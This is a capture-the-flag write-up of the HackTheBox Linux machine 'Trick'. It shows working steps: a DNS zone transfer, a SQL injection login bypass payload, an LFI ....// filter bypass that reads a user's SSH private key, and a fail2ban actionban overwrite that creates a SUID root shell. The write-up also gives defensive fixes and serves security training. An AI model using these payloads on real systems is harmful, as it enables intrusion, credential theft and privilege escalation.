# HTB: Trick

![](https://img.shields.io/badge/OS-Linux-blue)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![](https://img.shields.io/badge/Status-Retired-green)

**Tags:** `dns-zone-transfer` `vhost-enumeration` `sqli-auth-bypass` `lfi` `filter-bypass` `path-traversal` `ssh-key-theft` `fail2ban` `group-abuse` `privilege-escalation`

---

## Overview

Trick is an Easy-rated Linux machine that chains four distinct techniques into a full compromise. DNS zone transfer on port 53 reveals a hidden subdomain (`preprod-payroll.trick.htb`) running a payroll application. SQL injection on the login form bypasses authentication entirely. Virtual host fuzzing uncovers a second subdomain (`preprod-marketing.trick.htb`) with a Local File Inclusion vulnerability — a `....//` filter bypass evades a naive path traversal filter, allowing the SSH private key of user `michael` to be read directly from the web. Privilege escalation abuses `michael`'s membership in the `security` group, which grants write access to fail2ban's action configuration directory. Replacing the `actionban` command and triggering a ban yields a root shell.

### Attack Path

```
[Recon]
  nmap → port 22, 25, 53, 80
       ↓
[Phase 1 — DNS Zone Transfer]
  dig axfr @10.129.227.180 trick.htb
  → preprod-payroll.trick.htb discovered
       ↓
[Phase 2 — SQLi Auth Bypass]
  preprod-payroll.trick.htb/index.php login form
  → admin' or '1'='1' -- -
  → authenticated as admin
       ↓
[Phase 3 — VHost Fuzzing + LFI]
  ffuf -w subdomains.txt -H "Host: preprod-FUZZ.trick.htb"
  → preprod-marketing.trick.htb discovered
  → ?page= parameter → LFI
  → filter blocks ../  → bypass: ....//
  → /home/michael/.ssh/id_rsa leaked
  → SSH as michael → user.txt
       ↓
[Phase 4 — fail2ban Group Abuse → Root]
  id → michael in 'security' group
  ls -la /etc/fail2ban/action.d/ → writable by security group
  → replace actionban in iptables-multiport.conf
  → sudo /etc/init.d/fail2ban restart
  → trigger ban via failed SSH logins
  → /tmp/rootbash -p → root
```

---

## Enumeration

### Nmap

```
$ sudo nmap -sC -sV -p- --min-rate 5000 -oA nmap/trick 10.129.227.180

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
25/tcp open  smtp    Postfix smtpd
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
80/tcp open  http    nginx 1.14.2
```

Port 53 (DNS) is open — always worth attempting a zone transfer when DNS is exposed.

---

## Phase 1 — DNS Zone Transfer

### Why Zone Transfers Matter

DNS zone transfers (`AXFR`) are meant for replication between authoritative name servers. When a DNS server is misconfigured to allow transfers from any client, an attacker receives the complete zone file — every hostname, subdomain, and IP in the domain. This is equivalent to handing an attacker a full map of the internal naming structure.

```bash
dig axfr @10.129.227.180 trick.htb
```

```
trick.htb.          604800  IN  SOA   trick.htb. root.trick.htb. ...
trick.htb.          604800  IN  NS    trick.htb.
trick.htb.          604800  IN  A     127.0.0.1
preprod-payroll.trick.htb. 604800 IN A 192.168.0.1
root.trick.htb.     604800  IN  A     127.0.0.1
```

Hidden subdomain found: `preprod-payroll.trick.htb`. Add both to `/etc/hosts`:

```bash
echo "10.129.227.180 trick.htb preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2 — SQL Injection Auth Bypass

### The Payroll Application

`preprod-payroll.trick.htb` hosts a login form. Standard login attempts fail, but the form is vulnerable to SQL injection.

### Payload

```
Username: admin' or '1'='1' -- -
Password: anything
```

The underlying query becomes:

```sql
SELECT * FROM users WHERE username='admin' or '1'='1' -- -' AND password='...'
```

The `OR '1'='1'` condition is always true, and the `-- -` comments out the password check entirely. Authentication bypassed — logged in as admin.

### Why This Happens

The application concatenates user input directly into the SQL query without parameterisation. The fix is a single line of code — a prepared statement. Despite being one of the oldest web vulnerabilities documented, SQLi auth bypass remains widespread in legacy PHP applications.

---

## Phase 3 — VHost Fuzzing + LFI → SSH Key

### Virtual Host Discovery

The `preprod-` naming convention suggests more subdomains. Fuzzing with ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://trick.htb \
  -H "Host: preprod-FUZZ.trick.htb" \
  -fs 5480
```

```
marketing               [Status: 200, Size: 9660]
```

Add to `/etc/hosts`:

```bash
echo "10.129.227.180 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts
```

### Local File Inclusion

`preprod-marketing.trick.htb` serves a static-looking site with a `?page=` parameter:

```
http://preprod-marketing.trick.htb/index.php?page=about.html
```

Testing for LFI:

```
?page=../../../etc/passwd     → blocked ("attack detected")
?page=....//....//....//etc/passwd  → returns /etc/passwd content ✓
```

### The Filter Bypass

The application filters `../` but does so naively — it removes the exact string `../` once, without looping. Sending `....//` leaves `../` after the filter strips the inner `../`:

```
....//  →  strip "../"  →  ../
```

Repeating this pattern bypasses the filter completely.

### Reading michael's SSH Key

```
?page=....//....//....//....//home/michael/.ssh/id_rsa
```

Private key returned in full. Save it and connect:

```bash
chmod 600 michael_id_rsa
ssh -i michael_id_rsa michael@trick.htb
```

```
michael@trick:~$ cat user.txt
<flag>
```

---

## Phase 4 — fail2ban Group Abuse → Root

### Enumerating Group Membership

```bash
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

The `security` group is non-standard — worth investigating what it grants access to.

```bash
find / -group security 2>/dev/null
```

```
/etc/fail2ban/action.d
```

```bash
ls -la /etc/fail2ban/action.d/
# drwxrwx--- 2 root security 4096 ...
```

The `security` group has **write access** to fail2ban's action configuration directory.

### How fail2ban Works

fail2ban monitors log files for failed authentication attempts. When a threshold is exceeded, it fires an "action" — typically running an `iptables` command to block the offending IP. The action commands are defined in `.conf` files in `/etc/fail2ban/action.d/`.

### The Exploit

By replacing the `actionban` command in `iptables-multiport.conf` with a malicious payload, any ban triggered by fail2ban will execute our command as root.

```bash
# Step 1: Backup original
cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf.bak

# Step 2: Replace actionban
cat > /etc/fail2ban/action.d/iptables-multiport.conf << 'EOF'
[INCLUDES]
before = iptables-common.conf

[Definition]
actionstart = ...
actionstop = ...
actioncheck = ...
actionban = cp /bin/bash /tmp/rootbash && chmod 4777 /tmp/rootbash
actionunban = ...
EOF

# Step 3: Restart fail2ban to load new config (michael can do this via sudo)
sudo /etc/init.d/fail2ban restart

# Step 4: Trigger a ban — 5 failed SSH attempts from attacker machine
for i in {1..5}; do ssh -o "StrictHostKeyChecking no" wronguser@trick.htb 2>/dev/null; done

# Step 5: Wait a moment, then check
ls -la /tmp/rootbash

# Step 6: Execute root shell
/tmp/rootbash -p
```

```
rootbash-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) egid=0(root)

rootbash-5.0# cat /root/root.txt
<flag>
```

**Important:** The config replacement and `fail2ban restart` must happen quickly — fail2ban periodically restores modified config files. If the rootbash doesn't appear, repeat from Step 2.

---

## Flags

```
user.txt  →  [obtained via SSH as michael]
root.txt  →  [obtained via fail2ban actionban abuse]
```

---

## What I Learned

**DNS Zone Transfers Are Still Misconfigured**
`dig axfr` should be in every recon checklist when port 53 is open. It takes two seconds and can reveal the entire internal naming structure. The fix is a single `allow-transfer { none; };` line in BIND config.

**Naive String Filters Are Trivially Bypassed**
The `....//` bypass works because the filter removes `../` once without looping. This class of one-pass filter bypass is extremely common in custom-built PHP applications. The correct fix is to resolve the path to an absolute path using `realpath()` and verify it starts with the allowed base directory — not to blacklist traversal strings.

**Group Membership as a Privilege Escalation Vector**
`id` is one of the first commands to run after getting a shell. Non-standard groups (`security`, `docker`, `disk`, `adm`, `lxd`) frequently grant write access to sensitive directories or the ability to interact with privileged services. fail2ban's action directory being writable by a non-root group is a real-world misconfiguration that shows up on actual engagements.

**Timing Matters in File-Based Exploits**
The fail2ban config was being periodically restored, requiring the replacement and restart to be chained quickly. On real engagements, services with self-healing configs (monitoring daemons, config management tools) add a timing dimension to exploitation that pure technical knowledge doesn't prepare you for.

---

## References

- [DNS Zone Transfer — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer)
- [SQL Injection Auth Bypass — PortSwigger](https://portswigger.net/web-security/sql-injection)
- [LFI — OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [fail2ban Privilege Escalation — GTFOBins](https://gtfobins.github.io/gtfobins/fail2ban/)
- [HackTheBox — Trick](https://www.hackthebox.com/machines/trick)
